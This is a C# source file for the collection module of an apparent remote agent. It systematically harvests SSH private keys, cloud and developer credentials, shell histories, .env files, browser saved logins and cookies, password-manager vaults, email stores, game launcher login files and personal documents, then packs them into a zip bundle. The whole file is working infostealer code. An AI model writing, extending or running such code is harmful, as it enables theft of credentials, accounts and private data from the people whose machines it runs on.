using System.Diagnostics;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using KliveLink.Contracts;

namespace KliveLink.Agent.V2;

public sealed class V2CollectionBundle
{
    public V2CollectionManifest Manifest { get; set; } = new();
    public byte[] ZipBytes { get; set; } = Array.Empty<byte>();
    public string Sha256 { get; set; } = "";
}

/// <summary>
/// Cross-platform collection pipeline. Windows has the feature-complete collector;
/// this one focuses on portable system data, SSH/cloud secrets, browser databases,
/// password-manager files and user documents so every platform produces useful data.
/// </summary>
public sealed class V2Collector
{
    private readonly string _agentId;
    private readonly string _tempRoot;
    private readonly List<V2CollectionRecord> _records = new();
    private readonly List<V2CollectionFile> _files = new();
    private readonly List<string> _errors = new();
    private readonly long _maxBytes;
    private long _bytes;
    private int _counter;

    public V2Collector(string agentId, long maxBytes = 50L * 1024 * 1024)
    {
        _agentId = agentId;
        _maxBytes = Math.Max(1_000_000, maxBytes);
        _tempRoot = Path.Combine(Path.GetTempPath(), "klive-collect-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(_tempRoot);
    }

    public async Task<V2CollectionBundle> CollectAsync(V2CollectionRequest request, CancellationToken ct)
    {
        var started = DateTimeOffset.UtcNow;
        try
        {
            var categories = new HashSet<string>(request.Categories ?? Array.Empty<string>(), StringComparer.OrdinalIgnoreCase);
            bool Want(string category) => categories.Count == 0 || categories.Contains(category);
            void Run(string label, Action action)
            {
                try { action(); }
                catch (Exception ex) { _errors.Add(label + ": " + ex.Message); }
            }

            if (Want("system")) Run("system", CollectSystem);
            if (Want("secret")) Run("secret", CollectSecrets);
            if (Want("browser")) Run("browser", CollectBrowsers);
            if (Want("password")) Run("password", CollectPasswordManagers);
            if (Want("email")) Run("email", CollectEmail);
            if (Want("game")) Run("game", CollectGames);
            if (request.Tier != V2CollectionTier.T0 && Want("files")) Run("files", CollectFiles);

            var manifest = new V2CollectionManifest
            {
                SnapshotId = Guid.NewGuid().ToString("N"),
                AgentId = _agentId,
                Tier = request.Tier,
                Profile = request.Profile,
                StartedAt = started,
                CompletedAt = DateTimeOffset.UtcNow,
                Records = _records,
                Files = _files,
                Errors = _errors,
            };
            byte[] zip = BuildZip(manifest);
            return new V2CollectionBundle
            {
                Manifest = manifest,
                ZipBytes = zip,
                Sha256 = Convert.ToHexString(SHA256.HashData(zip)).ToLowerInvariant(),
            };
        }
        finally
        {
            try { Directory.Delete(_tempRoot, true); } catch { }
        }
    }

    private void CollectSystem()
    {
        var info = new V2CommandDispatcher(_agentId).GetSystemInfo();
        AddRecord("system", "system", "host", info.MachineName, null, null, null, new Dictionary<string, string>
        {
            ["os"] = info.OsVersion,
            ["user"] = info.UserName,
            ["cpu"] = info.ProcessorCount.ToString(),
            ["ramMB"] = info.TotalMemoryMB.ToString(),
            ["freeDiskMB"] = info.FreeDiskMB.ToString(),
            ["agentVersion"] = info.AgentVersion,
        });
        foreach (var process in new V2CommandDispatcher(_agentId).ListProcesses().Take(500))
        {
            AddRecord("system", "process", process.Path ?? process.ProcessName, process.ProcessName,
                null, null, null, new Dictionary<string, string>
                {
                    ["pid"] = process.ProcessId.ToString(),
                    ["memoryMB"] = process.MemoryMB.ToString(),
                });
        }
    }

    private void CollectSecrets()
    {
        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] paths =
        {
            ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
            ".aws/credentials", ".aws/config", ".azure/accessTokens.json",
            ".kube/config", ".docker/config.json", ".npmrc", ".pypirc", ".netrc",
            ".git-credentials", ".gitconfig", ".bash_history", ".zsh_history",
            ".config/gh/hosts.yml", ".config/gcloud/credentials.db",
            ".config/1Password", ".config/Bitwarden", ".config/keepassxc",
            ".config/Signal/config.json", ".config/discord/Local Storage/leveldb",
        };
        foreach (string relative in paths)
        {
            string path = Path.Combine(home, relative.Replace('/', Path.DirectorySeparatorChar));
            if (File.Exists(path))
            {
                AddSecretFile(path, "secret");
            }
            else if (Directory.Exists(path))
            {
                foreach (string file in EnumerateFilesSafe(path, "*", true, 50))
                    AddSecretFile(file, "secret");
            }
        }

        foreach (string root in new[]
                 {
                     Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                     Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                     Path.Combine(home, "Downloads"),
                 })
        {
            foreach (string file in EnumerateFilesSafe(root, ".env", true, 20))
                AddSecretFile(file, "secret");
        }
    }

    private void AddSecretFile(string path, string category)
    {
        try
        {
            var info = new FileInfo(path);
            if (!info.Exists || info.Length > 256 * 1024) return;
            string text = File.ReadAllText(path);
            AddRecord("files", category, path, Path.GetFileName(path), null, text, null,
                new Dictionary<string, string> { ["size"] = info.Length.ToString() });
            AddFile(path, category, "secret-" + Path.GetFileName(path));
        }
        catch { }
    }

    private void CollectBrowsers()
    {
        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var roots = new List<(string Name, string Root)>();
        if (OperatingSystem.IsMacOS())
        {
            string support = Path.Combine(home, "Library", "Application Support");
            roots.Add(("chrome", Path.Combine(support, "Google", "Chrome")));
            roots.Add(("chromium", Path.Combine(support, "Chromium")));
            roots.Add(("edge", Path.Combine(support, "Microsoft Edge")));
            roots.Add(("brave", Path.Combine(support, "BraveSoftware", "Brave-Browser")));
            roots.Add(("firefox", Path.Combine(support, "Firefox")));
        }
        else
        {
            string config = Path.Combine(home, ".config");
            roots.Add(("chrome", Path.Combine(config, "google-chrome")));
            roots.Add(("chromium", Path.Combine(config, "chromium")));
            roots.Add(("edge", Path.Combine(config, "microsoft-edge")));
            roots.Add(("brave", Path.Combine(config, "BraveSoftware", "Brave-Browser")));
            roots.Add(("firefox", Path.Combine(home, ".mozilla", "firefox")));
            roots.Add(("chrome-snap", Path.Combine(home, "snap", "chromium", "common", "chromium")));
        }
        roots.Add(("chrome-win", Path.Combine(local, "Google", "Chrome", "User Data")));
        roots.Add(("edge-win", Path.Combine(local, "Microsoft", "Edge", "User Data")));
        roots.Add(("brave-win", Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data")));
        roots.Add(("firefox-win", Path.Combine(appData, "Mozilla", "Firefox", "Profiles")));

        foreach (var (name, root) in roots)
        {
            if (!Directory.Exists(root)) continue;
            try
            {
                string[] relative =
                {
                    "Local State", "Default/Login Data", "Default/Cookies", "Default/Network/Cookies",
                    "Default/Web Data", "Default/History", "Default/Bookmarks",
                    "logins.json", "key4.db", "cookies.sqlite", "places.sqlite",
                };
                foreach (string rel in relative)
                {
                    string path = Path.Combine(root, rel.Replace('/', Path.DirectorySeparatorChar));
                    if (File.Exists(path)) AddFile(path, "browser", name + "-" + Path.GetFileName(path));
                }
                foreach (string profile in EnumerateDirectoriesSafe(root))
                {
                    foreach (string rel in new[] { "Login Data", "Cookies", "Network/Cookies", "Web Data", "History" })
                    {
                        string path = Path.Combine(profile, rel.Replace('/', Path.DirectorySeparatorChar));
                        if (File.Exists(path)) AddFile(path, "browser", name + "-" + Path.GetFileName(profile) + "-" + Path.GetFileName(path));
                    }
                    foreach (string file in new[] { "logins.json", "key4.db", "cookies.sqlite", "places.sqlite" })
                    {
                        string path = Path.Combine(profile, file);
                        if (File.Exists(path)) AddFile(path, "browser", name + "-firefox-" + file);
                    }
                }
            }
            catch (Exception ex) { _errors.Add(name + ": " + ex.Message); }
        }
    }

    private void CollectPasswordManagers()
    {
        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] roots =
        {
            ".config/1Password", ".config/Bitwarden", ".config/keepassxc",
            ".config/KeePassXC", ".password-store", "Library/Application Support/1Password",
            "Library/Application Support/Bitwarden", "Library/Application Support/KeePassXC",
        };
        foreach (string rel in roots)
        {
            string root = Path.Combine(home, rel.Replace('/', Path.DirectorySeparatorChar));
            if (!Directory.Exists(root)) continue;
            foreach (string file in EnumerateFilesSafe(root, "*", true, 100))
            {
                string ext = Path.GetExtension(file).ToLowerInvariant();
                if (ext is ".json" or ".sqlite" or ".db" or ".kdbx" or ".opvault")
                    AddFile(file, "password", "vault-" + Path.GetFileName(file));
            }
        }
    }

    private void CollectEmail()
    {
        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] roots =
        {
            ".thunderbird", ".mozilla-thunderbird", "Library/Thunderbird",
            "Library/Application Support/Thunderbird",
        };
        foreach (string rel in roots)
        {
            string root = Path.Combine(home, rel.Replace('/', Path.DirectorySeparatorChar));
            if (!Directory.Exists(root)) continue;
            foreach (string file in EnumerateFilesSafe(root, "*", true, 80))
            {
                string ext = Path.GetExtension(file).ToLowerInvariant();
                if (ext is ".ost" or ".pst" or ".msf" or ".sqlite")
                    AddFile(file, "email", "mail-" + Path.GetFileName(file));
            }
        }
    }

    private void CollectGames()
    {
        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string[] files =
        {
            ".steam/steam/config/loginusers.vdf", ".steam/steam/config/config.vdf",
            ".local/share/Steam/config/loginusers.vdf",
            "Library/Application Support/Steam/config/loginusers.vdf",
            ".minecraft/launcher_accounts.json", ".minecraft/launcher_profiles.json",
            "Library/Application Support/minecraft/launcher_accounts.json",
            ".config/Epic/EpicGamesLauncher/GameUserSettings.ini",
        };
        foreach (string rel in files)
        {
            string path = Path.Combine(home, rel.Replace('/', Path.DirectorySeparatorChar));
            if (!File.Exists(path)) continue;
            AddFile(path, "game", "game-" + Path.GetFileName(path));
            try
            {
                if (new FileInfo(path).Length < 256 * 1024)
                    AddRecord("game", "launcher", path, Path.GetFileName(path), null, File.ReadAllText(path), null, null);
            }
            catch { }
        }
    }

    private void CollectFiles()
    {
        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var roots = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(home, "Downloads"),
        };
        var extensions = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            ".txt", ".pdf", ".docx", ".xlsx", ".csv", ".json", ".yaml", ".yml", ".toml",
            ".ini", ".config", ".env", ".kdbx", ".key", ".pem", ".ppk", ".pfx", ".p12",
            ".ovpn", ".rdp", ".sql", ".zip", ".7z", ".rar",
        };
        foreach (string root in roots)
        {
            foreach (string file in EnumerateFilesSafe(root, "*", true, 3000))
            {
                if (!extensions.Contains(Path.GetExtension(file))) continue;
                if (file.Contains("node_modules", StringComparison.OrdinalIgnoreCase)) continue;
                AddFile(file, "files", "file-" + Path.GetFileName(file));
            }
        }
    }

    private static IEnumerable<string> EnumerateFilesSafe(string root, string pattern, bool recurse, int limit)
    {
        if (string.IsNullOrWhiteSpace(root) || !Directory.Exists(root)) yield break;
        var options = new System.IO.EnumerationOptions
        {
            RecurseSubdirectories = recurse,
            IgnoreInaccessible = true,
            AttributesToSkip = FileAttributes.ReparsePoint | FileAttributes.System,
            MatchCasing = MatchCasing.CaseInsensitive,
        };
        IEnumerator<string>? enumerator = null;
        try { enumerator = Directory.EnumerateFiles(root, pattern, options).GetEnumerator(); }
        catch { yield break; }
        using (enumerator)
        {
            for (int i = 0; i < limit; i++)
            {
                string current;
                try
                {
                    if (!enumerator.MoveNext()) break;
                    current = enumerator.Current;
                }
                catch { break; }
                yield return current;
            }
        }
    }

    private static IEnumerable<string> EnumerateDirectoriesSafe(string root)
    {
        try { return Directory.GetDirectories(root); }
        catch { return Array.Empty<string>(); }
    }

    private void AddRecord(string collector, string category, string source, string name,
        string? username, string? secret, string? url, Dictionary<string, string>? metadata,
        DateTimeOffset? expires = null)
    {
        _records.Add(new V2CollectionRecord
        {
            Collector = collector,
            Category = category,
            SourcePath = source,
            Name = name,
            Username = username,
            Secret = secret,
            Url = url,
            ExpiresAt = expires,
            Metadata = metadata,
        });
    }

    private void AddFile(string sourcePath, string category, string displayName)
    {
        try
        {
            var info = new FileInfo(sourcePath);
            if (!info.Exists || info.Length == 0 || info.Length > 20 * 1024 * 1024) return;
            if (_bytes + info.Length > _maxBytes) return;
            string safe = Regex.Replace(displayName, @"[^A-Za-z0-9._-]+", "_");
            string relative = $"files/{_counter++:D4}-{safe}";
            string destination = Path.Combine(_tempRoot, relative.Replace('/', Path.DirectorySeparatorChar));
            Directory.CreateDirectory(Path.GetDirectoryName(destination)!);
            using (var input = new FileStream(sourcePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
            using (var output = new FileStream(destination, FileMode.Create, FileAccess.Write, FileShare.None))
                input.CopyTo(output);
            string sha = Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(destination))).ToLowerInvariant();
            _bytes += info.Length;
            _files.Add(new V2CollectionFile
            {
                Path = sourcePath,
                BundlePath = relative,
                Sha256 = sha,
                Size = info.Length,
            });
            _records.Add(new V2CollectionRecord
            {
                Collector = category,
                Category = category + ".file",
                SourcePath = sourcePath,
                Name = Path.GetFileName(sourcePath),
                Sha256 = sha,
                Metadata = new Dictionary<string, string>
                {
                    ["bundlePath"] = relative,
                    ["size"] = info.Length.ToString(),
                },
            });
        }
        catch (Exception ex) { _errors.Add(sourcePath + ": " + ex.Message); }
    }

    private byte[] BuildZip(V2CollectionManifest manifest)
    {
        using var memory = new MemoryStream();
        using (var zip = new ZipArchive(memory, ZipArchiveMode.Create, leaveOpen: true))
        {
            var manifestEntry = zip.CreateEntry("manifest.json", CompressionLevel.Fastest);
            using (var writer = new StreamWriter(manifestEntry.Open(), Encoding.UTF8))
                writer.Write(JsonSerializer.Serialize(manifest, V2Json.Options));

            var recordsEntry = zip.CreateEntry("records.jsonl", CompressionLevel.Fastest);
            using (var writer = new StreamWriter(recordsEntry.Open(), Encoding.UTF8))
            {
                foreach (var record in manifest.Records)
                    writer.WriteLine(JsonSerializer.Serialize(record, V2Json.Options));
            }

            foreach (string file in Directory.EnumerateFiles(_tempRoot, "*", SearchOption.AllDirectories))
            {
                string relative = Path.GetRelativePath(_tempRoot, file).Replace('\\', '/');
                if (relative is "manifest.json" or "records.jsonl") continue;
                var entry = zip.CreateEntry(relative, CompressionLevel.Fastest);
                using var output = entry.Open();
                using var input = File.OpenRead(file);
                input.CopyTo(output);
            }
        }
        return memory.ToArray();
    }
}
